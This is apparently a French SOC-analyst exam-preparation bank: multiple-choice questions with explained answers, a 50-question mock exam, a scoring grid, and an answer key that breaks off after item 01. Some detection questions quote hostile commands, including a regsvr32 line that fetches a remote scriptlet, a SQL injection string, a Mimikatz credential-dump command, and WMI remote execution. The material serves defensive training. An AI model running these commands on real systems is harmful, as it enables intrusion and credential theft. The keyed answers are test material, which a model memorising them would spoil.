- **A.** Uniquement les captures d'écran des consoles.
- **B.** Une liste chronologique exhaustive des commandes exécutées par les analystes et des requêtes SIEM, sans résumé pour la direction.
- **C.** Résumé exécutif, chronologie, impact, cause racine, réponse, recommandations et annexes techniques.
- **D.** Une copie de la politique de sécurité de l'entreprise.

**Réponse correcte : C**

> **Explication technique :** Le résumé exécutif permet aux décideurs de comprendre rapidement la situation et les risques. Le corps du rapport détaille les faits vérifiés et les conclusions, et les annexes fournissent les éléments techniques. Il faut distinguer clairement les faits avérés des hypothèses.
>
> *Compétence évaluée : SOC Reporting / Rapport d'incident.*

### Question 194 – [Niveau : Intermédiaire]

Qu'est-ce qu'une matrice d'escalade dans un SOC ?

- **A.** Un document définissant, selon la sévérité et le type d'incident, qui doit être contacté, par quel moyen et dans quels délais.
- **B.** Un graphique des performances des serveurs.
- **C.** Un tableau croisant les types d'incidents et les outils de détection, indiquant quel produit doit générer chaque alerte.
- **D.** Une matrice de chiffrement des mots de passe.

**Réponse correcte : A**

> **Explication technique :** La matrice d'escalade précise les niveaux fonctionnels (Tier 1, 2, 3, management du SOC, RSSI) et hiérarchiques (direction, juridique, communication), avec les coordonnées et délais associés. Elle évite les hésitations en situation de crise.
>
> *Compétence évaluée : SOC Reporting / Matrice d'escalade.*

### Question 195 – [Niveau : Intermédiaire]

Comment définir la sévérité d'un incident de manière cohérente ?

- **A.** En fonction du nom de l'outil qui a généré l'alerte.
- **B.** En fonction uniquement de l'heure à laquelle l'alerte a été reçue.
- **C.** Selon la sévérité attribuée par l'outil de détection, qui ne doit jamais être réévaluée au cours de l'investigation.
- **D.** En combinant impact et urgence selon une grille documentée et partagée.

**Réponse correcte : D**

> **Explication technique :** Une grille de sévérité documentée (par exemple de P1 à P4) garantit la cohérence entre analystes et équipes, et pilote les SLA et l'escalade. Elle combine généralement l'impact métier et l'urgence, éventuellement réévalués au cours de l'investigation.
>
> *Compétence évaluée : SOC Reporting / Sévérité.*

### Question 196 – [Niveau : Intermédiaire]

Lors de la définition des processus de réponse, à quoi sert une matrice RACI ?

- **A.** À calculer le score CVSS des vulnérabilités.
- **B.** À préciser, pour chaque activité, qui réalise, qui est redevable, qui est consulté et qui est informé.
- **C.** À classer les incidents par niveau de risque, d'impact et d'urgence afin de déterminer les délais de réponse applicables à chacun.
- **D.** À chiffrer les communications du SOC.

**Réponse correcte : B**

> **Explication technique :** La matrice RACI clarifie les rôles entre le SOC, l'IT, le juridique, la communication et la direction. Elle réduit les zones d'ombre lors des incidents, par exemple pour savoir qui décide d'isoler un serveur critique.
>
> *Compétence évaluée : SOC Reporting / RACI.*

### Question 197 – [Niveau : Intermédiaire]

Quel mécanisme garantit l'amélioration continue des opérations SOC ?

- **A.** Le remplacement régulier des outils de détection par les solutions les mieux classées par les analystes, sans revue des processus existants.
- **B.** Le gel complet de toutes les règles et procédures existantes.
- **C.** Un cycle régulier d'analyse (incidents, KPI, RETEX) débouchant sur tuning, détections, formation et playbooks.
- **D.** La réduction du nombre d'analystes chaque trimestre.

**Réponse correcte : C**

> **Explication technique :** L'amélioration continue suit un cycle de type PDCA (Plan-Do-Check-Act). Les retours d'expérience, les exercices (tabletop, purple team) et les métriques permettent d'identifier les lacunes et de prioriser les améliorations.
>
> *Compétence évaluée : SOC Reporting / Amélioration continue.*

### Question 198 – [Niveau : Avancé / Expert]

Le MTTR d'un SOC a fortement baissé ce trimestre, mais le nombre d'incidents rouverts a triplé. Quelle est l'interprétation la plus pertinente ?

- **A.** Le SOC est devenu plus efficace sur tous les plans : un MTTR en baisse démontre à lui seul l'amélioration de la qualité de la réponse.
- **B.** Le SIEM ne génère plus d'alertes.
- **C.** Les attaquants ont cessé de cibler l'organisation.
- **D.** Les incidents sont probablement clôturés trop rapidement, sans éradication complète : la qualité doit être mesurée en plus de la rapidité.

**Réponse correcte : D**

> **Explication technique :** Optimiser un seul indicateur peut produire des effets pervers (loi de Goodhart). Des indicateurs complémentaires, comme le taux de réouverture, la qualité de la documentation ou les revues de tickets par échantillonnage, équilibrent la mesure de la performance.
>
> *Compétence évaluée : SOC Reporting / Interprétation des métriques.*

### Question 199 – [Niveau : Avancé / Expert]

Un SOC constate que 70 % des alertes Tier 1 concernent des phishings signalés, traités manuellement en 20 minutes chacun. Quelle mesure apporte le meilleur gain opérationnel ?

- **A.** Recruter des analystes supplémentaires dédiés au phishing et allonger le délai de traitement prévu dans le SLA, sans modifier le processus existant.
- **B.** Automatiser l'analyse des signalements via un playbook SOAR, l'humain ne traitant que les cas douteux.
- **C.** Demander aux utilisateurs de ne plus signaler les e-mails suspects.
- **D.** Désactiver la boîte de signalement de phishing.

**Réponse correcte : B**

> **Explication technique :** L'automatisation des tâches répétitives à fort volume (extraction des URL et pièces jointes, réputation, sandbox, recherche des autres destinataires, purge) libère du temps pour l'analyse à valeur ajoutée et réduit le MTTR. Décourager les signalements réduirait au contraire la capacité de détection.
>
> *Compétence évaluée : SOC Reporting / Capacité et effectifs.*

### Question 200 – [Niveau : Avancé / Expert]

Quel est l'intérêt principal d'un exercice sur table (tabletop exercise) simulant une attaque par ransomware ?

- **A.** Tester la coordination, les rôles et les décisions entre SOC, IT, direction et juridique, sans impact.
- **B.** Valider techniquement la restauration des sauvegardes et mesurer la vitesse de chiffrement d'un ransomware réel dans l'environnement de production.
- **C.** Vérifier la compatibilité des imprimantes réseau.
- **D.** Tester la vitesse de chiffrement des disques.

**Réponse correcte : A**

> **Explication technique :** Les exercices sur table révèlent les lacunes organisationnelles : décisions d'isolement, contact avec les autorités et l'assureur, communication externe, posture face à une demande de rançon. Leurs conclusions alimentent le plan de réponse et les playbooks.
>
> *Compétence évaluée : SOC Reporting / Exercice de crise.*

## Simulation d'examen final

50 questions inédites · durée indicative : 60 minutes · 2 points par bonne réponse (score sur 100). Les réponses figurent uniquement dans le corrigé.

### Question 01 – [Niveau : Intermédiaire]

Une alerte de proxy mentionne l'IP interne 10.20.30.45 il y a trois jours. Quelle source permet de déterminer avec certitude quel poste utilisait cette IP à ce moment ?

- **A.** La table ARP actuelle du commutateur, croisée avec le résultat d'un ping lancé aujourd'hui vers l'adresse IP.
- **B.** Le fichier hosts du poste de l'analyste.
- **C.** Les journaux DHCP (baux attribués), corrélés avec les journaux d'authentification ou l'inventaire EDR.
- **D.** Le résultat d'un ping lancé aujourd'hui.

### Question 02 – [Niveau : Intermédiaire]

Quel est le rôle de l'investigation et réponse automatisées (AIR) de Microsoft Defender XDR ?

- **A.** Remplacer le SIEM pour la conservation des journaux et la corrélation des alertes de toutes les sources de l'entreprise, y compris les pare-feux.
- **B.** Désactiver l'antivirus pendant l'investigation.
- **C.** Rédiger automatiquement les rapports destinés à la direction générale.
- **D.** Examiner automatiquement alertes et entités, puis proposer ou appliquer la remédiation selon la configuration.

### Question 03 – [Niveau : Intermédiaire]

Que signale l'Event ID 4648 ?

- **A.** Une connexion avec des identifiants explicites (ex. runas ou accès distant sous un autre compte).
- **B.** L'effacement du journal de sécurité.
- **C.** Une ouverture de session réussie avec un logon type 10 (RemoteInteractive) sur le serveur cible.
- **D.** La modification de la politique d'audit.

### Question 04 – [Niveau : Intermédiaire]

Des employés d'un même secteur sont infectés après avoir visité le site légitime d'une association professionnelle compromise. Quelle technique est utilisée ?

- **A.** Une attaque par force brute sur les comptes du site.
- **B.** Une attaque de point d'eau (watering hole).
- **C.** Un ARP spoofing.
- **D.** Une attaque de type MFA fatigue.

### Question 05 – [Niveau : Fondamental]

Quel port est utilisé par défaut par LDAP sécurisé par TLS (LDAPS) ?

- **A.** TCP 389.
- **B.** TCP 445.
- **C.** TCP 88.
- **D.** TCP 636.

### Question 06 – [Niveau : Avancé / Expert]

CloudTrail enregistre un événement ConsoleLogin réussi du compte root AWS à 3 h du matin, depuis une IP inconnue, suivi de la création d'utilisateurs IAM. Quelle évaluation est la plus juste ?

- **A.** Une activité normale de maintenance d'AWS, dont les équipes utilisent le compte root de chaque client pour appliquer les correctifs de la plateforme.
- **B.** Un incident critique : usage anormal du root et persistance probable via IAM ; confinement immédiat.
- **C.** Un événement informatif sans action requise.
- **D.** Un faux positif lié au fuseau horaire.

### Question 07 – [Niveau : Avancé / Expert]

Lors d'un exercice purple team, la technique T1003.001 est exécutée : l'EDR la bloque, mais aucune alerte n'apparaît dans le SIEM. Quelle est la conclusion la plus pertinente ?

- **A.** Une lacune d'intégration : la télémétrie EDR ne remonte pas au SIEM ; corriger puis retester.
- **B.** L'exercice est réussi : l'EDR ayant bloqué la technique, l'absence d'alerte dans le SIEM est normale et évite de surcharger les analystes.
- **C.** La technique T1003.001 n'est pas pertinente pour l'organisation.
- **D.** Le SIEM doit être remplacé immédiatement.

### Question 08 – [Niveau : Fondamental]

Quel est le rôle de l'enregistrement SPF d'un domaine ?

- **A.** Signer cryptographiquement le contenu et les en-têtes des e-mails sortants du domaine.
- **B.** Définir le serveur de messagerie qui reçoit les e-mails du domaine.
- **C.** Indiquer quels serveurs sont autorisés à envoyer des e-mails pour ce domaine.
- **D.** Chiffrer les e-mails de bout en bout.

### Question 09 – [Niveau : Fondamental]

Quel Event ID, enregistré sur le contrôleur de domaine, signale le verrouillage d'un compte utilisateur ?

- **A.** 4740.
- **B.** 4688.
- **C.** 1102.
- **D.** 4624.

### Question 10 – [Niveau : Fondamental]

En gestion des journaux, que désigne le parsing ?

- **A.** La compression et l'indexation des journaux avant archivage dans le stockage froid du SIEM.
- **B.** La duplication des journaux vers un second SIEM.
- **C.** L'extraction de champs structurés (date, IP, utilisateur) depuis le message brut.
- **D.** La suppression des journaux expirés.

### Question 11 – [Niveau : Intermédiaire]

Lors de l'investigation d'un serveur Linux compromis, quels emplacements vérifier en priorité pour la persistance ?

- **A.** Uniquement le répertoire /tmp.
- **B.** Les crontabs, les services systemd, le fichier ~/.ssh/authorized_keys et les scripts de démarrage du shell (.bashrc).
- **C.** Les journaux du serveur d'impression CUPS et le fichier /etc/hostname, qui contient la liste des services lancés au démarrage.
- **D.** Le fichier /etc/hostname.

### Question 12 – [Niveau : Intermédiaire]

Quel Event ID du journal Security signale la création d'une tâche planifiée lorsque l'audit des objets est activé ?

- **A.** 4720.
- **B.** 5140.
- **C.** 4771.
- **D.** 4698.

### Question 13 – [Niveau : Intermédiaire]

Un employé démissionnaire copie 12 Go de fichiers clients sur une clé USB la veille de son départ. Quelles sources permettent de confirmer et documenter les faits ?

- **A.** L'historique des mises à jour Windows.
- **B.** Les journaux DLP et EDR (USB, fichiers), corrélés avec les accès aux partages de fichiers.
- **C.** Les journaux de l'imprimante réseau uniquement.
- **D.** Les journaux du serveur DNS et du proxy web, qui enregistrent les transferts de fichiers vers les périphériques amovibles.

### Question 14 – [Niveau : Avancé / Expert]

L'EDR détecte l'exécution de rar.exe a -hp[motdepasse] C:\Users\Public\data.rar sur un serveur de fichiers, avec des centaines de fichiers de projets. Quelle tactique est observée et quelle action prioriser ?

- **A.** Une sauvegarde légitime réalisée par l'administrateur ; l'option -hp prouve qu'il s'agit d'une procédure approuvée de protection des données sensibles.
- **B.** Une mise à jour logicielle ; il faut redémarrer le serveur.
- **C.** Une attaque DDoS en cours ; il faut contacter le fournisseur d'accès.
- **D.** La préparation d'une exfiltration (T1560.001) ; surveiller les flux sortants et identifier le compte utilisé.

### Question 15 – [Niveau : Avancé / Expert]

Sysmon Event ID 17 montre la création d'un named pipe nommé \MSSE-1234-server par un processus lancé depuis un répertoire temporaire. Quelle hypothèse privilégier ?

- **A.** L'utilisation probable d'une balise Cobalt Strike avec une configuration par défaut, ce nom de pipe faisant partie de ses artefacts connus.
- **B.** Une session RDP légitime.
- **C.** Une communication normale de l'antivirus Microsoft Security Essentials, dont le service crée ce pipe pour échanger avec son moteur d'analyse temporaire.
- **D.** Une impression réseau via SMB.

### Question 16 – [Niveau : Avancé / Expert]

Quel processus parent, sur la machine cible, indique l'exécution de commandes via PowerShell Remoting (WinRM) ?

- **A.** lsass.exe.
- **B.** spoolsv.exe.
- **C.** wsmprovhost.exe.
- **D.** dwm.exe.

### Question 17 – [Niveau : Intermédiaire]

Dans un vecteur CVSS v3.1, que signifient les métriques AV:N/PR:N/UI:N ?

- **A.** La vulnérabilité ne concerne que les réseaux locaux sans fil.
- **B.** La vulnérabilité nécessite un accès physique, des privilèges élevés et une interaction de l'utilisateur.
- **C.** La vulnérabilité est exploitable par le réseau, mais nécessite des privilèges élevés préalables et une action de l'utilisateur ciblé.
- **D.** La vulnérabilité est exploitable à distance par le réseau, sans privilège préalable et sans interaction de l'utilisateur.

### Question 18 – [Niveau : Fondamental]

Quel Event ID indique qu'un membre a été ajouté à un groupe de sécurité global, comme « Domain Admins » ?

- **A.** 4728.
- **B.** 4740.
- **C.** 4634.
- **D.** 4776.

### Question 19 – [Niveau : Fondamental]

Quel principe consiste à n'accorder aux utilisateurs que les droits strictement nécessaires à leurs missions ?

- **A.** Le principe de la non-répudiation.
- **B.** Le principe de la défense en profondeur.
- **C.** Le principe du moindre privilège.
- **D.** Le principe de la séparation des réseaux.

### Question 20 – [Niveau : Intermédiaire]

L'EDR signale mshta.exe lancé par explorer.exe avec une URL distante en argument, suivi d'une connexion réseau sortante. Quelle est la meilleure interprétation ?

- **A.** Une mise à jour normale du moteur HTML d'Internet Explorer, déclenchée par l'utilisateur depuis l'explorateur de fichiers lors de l'ouverture d'une page.
- **B.** Une exécution probable d'une application HTA malveillante via un binaire système (T1218.005), souvent liée à un lien de phishing ou à un fichier LNK.
- **C.** Une synchronisation OneDrive.
- **D.** Un processus d'impression réseau.

### Question 21 – [Niveau : Avancé / Expert]

Sur un serveur, l'EDR montre wmiprvse.exe lançant powershell.exe avec une commande encodée, peu après un logon type 3 d'un compte administrateur depuis un autre poste. Quelle conclusion est la plus pertinente ?

- **A.** Une mise à jour automatique de Windows Defender.
- **B.** Un fonctionnement normal du service d'impression.
- **C.** Une tâche planifiée locale créée par l'utilisateur du serveur, exécutée par WmiPrvSE.exe qui est le planificateur de tâches de Windows.
- **D.** Une exécution à distance via WMI (T1047), par exemple avec wmic /node: process call create, utilisée pour le mouvement latéral.

### Question 22 – [Niveau : Fondamental]

Pourquoi calcule-t-on le hash SHA-256 d'une image disque au moment de son acquisition ?

- **A.** Pour pouvoir prouver ultérieurement que l'image n'a pas été modifiée.
- **B.** Pour compresser l'image disque.
- **C.** Pour chiffrer l'image et empêcher sa lecture par une personne non autorisée.
- **D.** Pour accélérer l'analyse de l'image.

### Question 23 – [Niveau : Avancé / Expert]

Le SOC constate que plusieurs postes n'émettent plus de requêtes vers les serveurs DNS internes, mais établissent des connexions HTTPS vers des résolveurs publics (ex. sur le port 443). Quel risque cela représente-t-il ?

- **A.** Une simple mise à jour des certificats racine.
- **B.** Le DoH contourne la surveillance et le filtrage DNS internes, et peut masquer des communications C2.
- **C.** Aucun risque : le chiffrement des requêtes DNS améliore la confidentialité et les résolveurs publics filtrent eux-mêmes les domaines malveillants.
- **D.** Une amélioration de la visibilité du SOC.

### Question 24 – [Niveau : Fondamental]

Dans MITRE ATT&CK, que représente une « tactique » ?

- **A.** Un identifiant de vulnérabilité.
- **B.** Une adresse IP malveillante.
- **C.** L'objectif de l'attaquant à une étape de l'attaque (le « pourquoi »), comme la persistance ou l'exfiltration.
- **D.** La manière précise dont l'attaquant atteint un objectif, comme l'utilisation de PowerShell ou d'une tâche planifiée.

### Question 25 – [Niveau : Intermédiaire]

Un analyste veut savoir quel processus a résolu un domaine C2 sur un poste. Quel événement Sysmon fournit cette information ?

- **A.** Event ID 22 (DNSEvent), qui associe la requête DNS au processus émetteur.
- **B.** Event ID 1 (Process Create).
- **C.** Event ID 5 (Process Terminated).
- **D.** Event ID 11 (FileCreate), qui enregistre chaque mise à jour du cache DNS local par le processus.

### Question 26 – [Niveau : Fondamental]

Dans IBM QRadar, que signifie l'indicateur EPS, souvent utilisé pour le dimensionnement et les licences ?

- **A.** Encrypted Packet Stream.
- **B.** Event Processing Score : la qualité moyenne du parsing.
- **C.** Events Per Second : le nombre d'événements traités par seconde.
- **D.** Error Priority Score.

### Question 27 – [Niveau : Intermédiaire]

Un analyste souhaite examiner une URL suspecte sans la visiter depuis son poste. Quel service est adapté ?

- **A.** Nmap avec les options -sV et --script http-title, lancé depuis le poste de l'analyste vers l'hôte de l'URL.
- **B.** Hashcat.
- **C.** Le Gestionnaire des tâches de Windows.
- **D.** urlscan.io, qui visite l'URL et fournit captures d'écran, requêtes, redirections et indicateurs associés.

### Question 28 – [Niveau : Avancé / Expert]

Le contrôleur de domaine enregistre de nombreux événements 4771 avec le code d'échec 0x18 pour des centaines de comptes différents depuis un même poste, en quelques minutes. Que conclure ?

- **A.** Une attaque DCSync.
- **B.** Un password spraying via Kerberos (échecs de pré-authentification dus à de mauvais mots de passe), qui ne génère pas nécessairement d'événements 4625.
- **C.** Une réplication AD défaillante.
- **D.** Une désynchronisation horaire entre le poste et le contrôleur de domaine, le code 0x18 signalant un décalage d'horloge supérieur à cinq minutes.

### Question 29 – [Niveau : Intermédiaire]

Sur un serveur Linux Debian/Ubuntu, quel fichier consulter pour analyser les tentatives de connexion SSH échouées ?

- **A.** /etc/hosts
- **B.** /var/log/auth.log
- **C.** /var/log/apt/history.log
- **D.** /var/log/dpkg.log

### Question 30 – [Niveau : Intermédiaire]

Un e-mail semblant provenir du directeur financier demande un virement urgent ; le champ Reply-To pointe vers une adresse externe différente. Quelle menace est la plus probable ?

- **A.** Une attaque par déni de service.
- **B.** Une campagne de spam publicitaire, car l'absence de pièce jointe et de lien exclut toute tentative de fraude.
- **C.** Une notification légitime du service de messagerie.
- **D.** Une fraude de type Business Email Compromise (BEC) par usurpation ou compte compromis.

### Question 31 – [Niveau : Fondamental]

Quelle responsabilité incombe principalement au SOC Manager ?

- **A.** Piloter l'équipe, les processus, les indicateurs de performance et la relation avec la direction et les métiers.
- **B.** Développer les malwares de test.
- **C.** Traiter les incidents techniques les plus complexes, réaliser l'analyse de malware et le reverse engineering pour l'équipe.
- **D.** Installer physiquement les capteurs réseau.

### Question 32 – [Niveau : Intermédiaire]

Que signifie le sinkholing d'un domaine malveillant ?

- **A.** Supprimer définitivement le domaine de tous les serveurs DNS du monde.
- **B.** Bloquer tout le trafic DNS de l'entreprise.
- **C.** Rediriger la résolution du domaine vers un serveur contrôlé par les défenseurs afin de neutraliser le C2 et d'identifier les machines infectées.
- **D.** Chiffrer le trafic vers le domaine malveillant et le rediriger vers un proxy d'inspection TLS afin d'analyser les commandes envoyées par le C2.

### Question 33 – [Niveau : Intermédiaire]

Pourquoi utiliser la commande tstats sur des data models accélérés dans Splunk Enterprise Security ?

- **A.** Pour chiffrer les résultats des recherches.
- **B.** Pour interroger des résumés indexés pré-calculés, ce qui accélère fortement les recherches sur de grands volumes normalisés selon le CIM.
- **C.** Pour transférer les journaux vers un autre SIEM.
- **D.** Pour forcer une recherche en temps réel sur les données brutes non indexées, ce qui garantit des résultats plus complets qu'une recherche classique.

### Question 34 – [Niveau : Intermédiaire]

Quelle mesure de protection native de Windows empêche Mimikatz (sekurlsa::logonpasswords) d'extraire les secrets NTLM et Kerberos depuis LSASS ?

- **A.** Le Script Block Logging de PowerShell, qui empêche l'exécution de Mimikatz en mémoire.
- **B.** L'activation du protocole SMBv1.
- **C.** Credential Guard, qui isole ces secrets grâce à la virtualisation (VBS).
- **D.** Le changement du fond d'écran par GPO.

### Question 35 – [Niveau : Fondamental]

Une attaque DDoS rendant le site web de l'entreprise inaccessible porte principalement atteinte à quel critère de sécurité ?

- **A.** L'intégrité.
- **B.** La confidentialité.
- **C.** La non-répudiation.
- **D.** La disponibilité.

### Question 36 – [Niveau : Intermédiaire]

Quand privilégier une règle NRT (Near-Real-Time) dans Microsoft Sentinel plutôt qu'une règle planifiée ?

- **A.** Pour des détections critiques et simples à déclencher au plus vite (exécution environ chaque minute).
- **B.** Pour générer des rapports mensuels destinés à la direction.
- **C.** Pour importer des flux de threat intelligence.
- **D.** Pour des corrélations complexes sur 14 jours de données avec de nombreuses jointures, car les règles NRT ne sont soumises à aucune limitation.

### Question 37 – [Niveau : Intermédiaire]

Dans Microsoft Sentinel, quel est le rôle des règles d'automatisation (automation rules) ?

- **A.** Écrire les requêtes KQL des règles d'analyse.
- **B.** Exécuter des requêtes KQL planifiées sur les journaux pour générer des alertes, en remplacement des règles d'analyse.
- **C.** Stocker les indicateurs de compromission.
- **D.** Automatiser le tri des incidents : attribution, statut, sévérité, tags et lancement de playbooks.

### Question 38 – [Niveau : Avancé / Expert]

Lors de l'analyse de la MFT NTFS, un fichier présente une date de création $STANDARD_INFORMATION en 2019, mais une date $FILE_NAME de la semaine dernière. Que suspecter ?

- **A.** Un comportement normal : $FILE_NAME est mis à jour à chaque lecture du fichier, alors que $STANDARD_INFORMATION reste figé.
- **B.** Un timestomping : l'attaquant a modifié les horodatages $SI pour faire paraître le fichier ancien.
- **C.** Un fichier système Windows d'origine.
- **D.** Un comportement normal lors de la copie d'un fichier.

### Question 39 – [Niveau : Intermédiaire]

Un analyste observe : regsvr32.exe /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll. De quelle technique s'agit-il ?

- **A.** Une exécution par proxy d'un binaire système signé (Squiblydoo, T1218.010) pour charger un scriptlet distant en contournant le contrôle applicatif.
- **B.** Une mise à jour du catalogue de pilotes.
- **C.** Un enregistrement légitime d'un composant COM Microsoft, la commande téléchargeant la dernière version du fichier scrobj.dll depuis un serveur de mise à jour.
- **D.** Une désinstallation de Microsoft Office.

### Question 40 – [Niveau : Avancé / Expert]

Un analyste découvre des événements 4768 avec un type de pré-authentification égal à 0 pour plusieurs comptes. Quelle attaque cela peut-il révéler et quelle remédiation appliquer ?

- **A.** Un Golden Ticket forgé sans pré-authentification ; il faut supprimer puis recréer le compte KRBTGT et redémarrer tous les contrôleurs de domaine.
- **B.** Un pass-the-hash ; il faut désactiver Kerberos.
- **C.** Un AS-REP Roasting ; il faut réactiver la pré-authentification Kerberos et renforcer ces mots de passe.
- **D.** Un DCSync ; il faut désactiver la réplication AD.

### Question 41 – [Niveau : Avancé / Expert]

Pourquoi recommande-t-on d'utiliser l'opérateur has plutôt que contains dans les requêtes KQL de Microsoft Sentinel lorsque c'est possible ?

- **A.** Parce que has est insensible au temps de rétention.
- **B.** Parce que contains modifie les données sources.
- **C.** Parce que contains est sensible à la casse et ne fonctionne que sur les colonnes de type dynamic, alors que has s'applique à toutes les colonnes.
- **D.** Parce que has s'appuie sur l'index des termes entiers, bien plus rapide que la recherche de sous-chaînes.

### Question 42 – [Niveau : Fondamental]

Qu'est-ce qu'une vulnérabilité zero-day ?

- **A.** Une vulnérabilité inconnue de l'éditeur ou pour laquelle aucun correctif n'est encore disponible au moment de son exploitation.
- **B.** Une vulnérabilité découverte le jour même par un scanner interne et corrigée dans la journée grâce au processus de gestion des correctifs.
- **C.** Une vulnérabilité qui n'affecte que les systèmes éteints.
- **D.** Une vulnérabilité ayant un score CVSS de 0.

### Question 43 – [Niveau : Avancé / Expert]

Les journaux d'un serveur web montrent des requêtes avec « UNION SELECT username,password FROM users-- » sur un paramètre id, avec des codes 200 et des tailles de réponse nettement supérieures à la normale. Quelle conclusion est la plus solide ?

- **A.** Une erreur de configuration du DNS.
- **B.** Un crawler de moteur de recherche légitime qui teste automatiquement la robustesse des paramètres d'URL indexés.
- **C.** Une injection SQL probablement réussie, à confirmer côté base de données et à traiter comme une fuite.
- **D.** Une simple tentative bloquée, car le code 200 signifie que le WAF a filtré la requête.

### Question 44 – [Niveau : Intermédiaire]

Après la compromission d'un compte Microsoft 365, quel artefact l'analyste doit-il vérifier en priorité dans le journal d'audit (OfficeActivity) ?

- **A.** La taille de la boîte aux lettres.
- **B.** La création de règles de boîte de réception (New-InboxRule, Set-InboxRule) transférant ou supprimant des e-mails.
- **C.** La langue de l'interface Outlook.
- **D.** La modification de la photo de profil, de la signature et de la langue de l'interface, qui révèle une prise de contrôle du compte.

### Question 45 – [Niveau : Intermédiaire]

Quel filtre Wireshark permet d'afficher les Client Hello TLS indiquant un nom de serveur spécifique ?

- **A.** dns.a == "exemple.com"
- **B.** http.host == "exemple.com" sur une session TLS chiffrée.
- **C.** tcp.flags.reset == 1
- **D.** tls.handshake.extensions_server_name == "exemple.com"

### Question 46 – [Niveau : Avancé / Expert]

Une mise à jour signée d'un logiciel de supervision légitime se met à contacter un domaine inconnu après une période de dormance de deux semaines. Quelle approche de détection est la plus efficace dans ce type d'attaque de la chaîne d'approvisionnement ?

- **A.** Le blocage des seules adresses IP déjà connues dans les flux CTI.
- **B.** La détection comportementale : nouvelles destinations, processus enfants inhabituels, écarts à la baseline.
- **C.** La comparaison du hash de la mise à jour avec celui publié sur le site de l'éditeur, qui suffit à exclure toute compromission de la chaîne d'approvisionnement.
- **D.** La vérification de la signature numérique, qui garantit l'absence de malveillance.

### Question 47 – [Niveau : Fondamental]

Quel Event ID Windows indique la création d'un nouveau compte utilisateur ?

- **A.** 4720.
- **B.** 4625.
- **C.** 7045.
- **D.** 4769.

### Question 48 – [Niveau : Fondamental]

Quel est l'objectif d'un honeypot déployé dans le réseau interne ?

- **A.** Remplacer l'IDS en bloquant automatiquement toutes les IP qui scannent le réseau interne.
- **B.** Accélérer la navigation web des utilisateurs.
- **C.** Attirer et détecter les attaquants, car toute interaction avec ce leurre est par nature suspecte.
- **D.** Remplacer le pare-feu périmétrique.

### Question 49 – [Niveau : Intermédiaire]

Le SOC crée dans l'AD un compte « svc_backup_admin » jamais utilisé, avec un SPN fictif. Quel est l'objectif ?

- **A.** Accélérer la réplication Active Directory.
- **B.** Sauvegarder automatiquement les contrôleurs de domaine.
- **C.** Servir de compte de service dédié aux sauvegardes AD, dont le SPN permet l'authentification Kerberos des agents de sauvegarde.
- **D.** Servir de honeytoken : toute demande de ticket sur ce compte trahit une reconnaissance ou un Kerberoasting.

### Question 50 – [Niveau : Fondamental]

Qu'est-ce qu'une sandbox dans le contexte de l'analyse de malware ?

- **A.** Un serveur de fichiers isolé sur lequel les analystes stockent les échantillons de malwares chiffrés en attente d'analyse statique.
- **B.** Un outil de chiffrement de disque.
- **C.** Un environnement isolé et instrumenté où exécuter un fichier suspect pour observer son comportement.
- **D.** Un pare-feu applicatif.

## Grille de réponses

| N° | Réponse | N° | Réponse |
|---|---|---|---|
| 01 | A ☐ B ☐ C ☐ D ☐ | 26 | A ☐ B ☐ C ☐ D ☐ |
| 02 | A ☐ B ☐ C ☐ D ☐ | 27 | A ☐ B ☐ C ☐ D ☐ |
| 03 | A ☐ B ☐ C ☐ D ☐ | 28 | A ☐ B ☐ C ☐ D ☐ |
| 04 | A ☐ B ☐ C ☐ D ☐ | 29 | A ☐ B ☐ C ☐ D ☐ |
| 05 | A ☐ B ☐ C ☐ D ☐ | 30 | A ☐ B ☐ C ☐ D ☐ |
| 06 | A ☐ B ☐ C ☐ D ☐ | 31 | A ☐ B ☐ C ☐ D ☐ |
| 07 | A ☐ B ☐ C ☐ D ☐ | 32 | A ☐ B ☐ C ☐ D ☐ |
| 08 | A ☐ B ☐ C ☐ D ☐ | 33 | A ☐ B ☐ C ☐ D ☐ |
| 09 | A ☐ B ☐ C ☐ D ☐ | 34 | A ☐ B ☐ C ☐ D ☐ |
| 10 | A ☐ B ☐ C ☐ D ☐ | 35 | A ☐ B ☐ C ☐ D ☐ |
| 11 | A ☐ B ☐ C ☐ D ☐ | 36 | A ☐ B ☐ C ☐ D ☐ |
| 12 | A ☐ B ☐ C ☐ D ☐ | 37 | A ☐ B ☐ C ☐ D ☐ |
| 13 | A ☐ B ☐ C ☐ D ☐ | 38 | A ☐ B ☐ C ☐ D ☐ |
| 14 | A ☐ B ☐ C ☐ D ☐ | 39 | A ☐ B ☐ C ☐ D ☐ |
| 15 | A ☐ B ☐ C ☐ D ☐ | 40 | A ☐ B ☐ C ☐ D ☐ |
| 16 | A ☐ B ☐ C ☐ D ☐ | 41 | A ☐ B ☐ C ☐ D ☐ |
| 17 | A ☐ B ☐ C ☐ D ☐ | 42 | A ☐ B ☐ C ☐ D ☐ |
| 18 | A ☐ B ☐ C ☐ D ☐ | 43 | A ☐ B ☐ C ☐ D ☐ |
| 19 | A ☐ B ☐ C ☐ D ☐ | 44 | A ☐ B ☐ C ☐ D ☐ |
| 20 | A ☐ B ☐ C ☐ D ☐ | 45 | A ☐ B ☐ C ☐ D ☐ |
| 21 | A ☐ B ☐ C ☐ D ☐ | 46 | A ☐ B ☐ C ☐ D ☐ |
| 22 | A ☐ B ☐ C ☐ D ☐ | 47 | A ☐ B ☐ C ☐ D ☐ |
| 23 | A ☐ B ☐ C ☐ D ☐ | 48 | A ☐ B ☐ C ☐ D ☐ |
| 24 | A ☐ B ☐ C ☐ D ☐ | 49 | A ☐ B ☐ C ☐ D ☐ |
| 25 | A ☐ B ☐ C ☐ D ☐ | 50 | A ☐ B ☐ C ☐ D ☐ |

**Score = bonnes réponses × 2 = ____ / 100**

## Notation et interprétation du score

| Score / 100 | Niveau | Recommandation |
|---|---|---|
| 90 – 100 | Excellent niveau de préparation | Vous maîtrisez le programme. Entretenez vos acquis et passez l'examen dans de bonnes conditions. |
| 80 – 89 | Très bon niveau | Ciblez les quelques domaines où subsistent des erreurs, puis refaites la simulation. |
| 70 – 79 | Niveau satisfaisant, quelques révisions nécessaires | Reprenez les explications des questions manquées et les modules correspondants de la banque. |
| 60 – 69 | Préparation insuffisante | Retravaillez les modules les plus faibles, notamment la détection, le triage et la réponse aux incidents. |
| < 60 | Révisions approfondies recommandées | Reprenez la banque de 200 questions module par module avant une nouvelle simulation. |

> Ces seuils sont indicatifs et ne représentent pas le barème officiel de certification EC-Council.

## Corrigé de la simulation d'examen

| N° | Réponse | Domaine | Niveau |
|---|---|---|---|
| 01 | **C** | Incident Response | Intermédiaire |
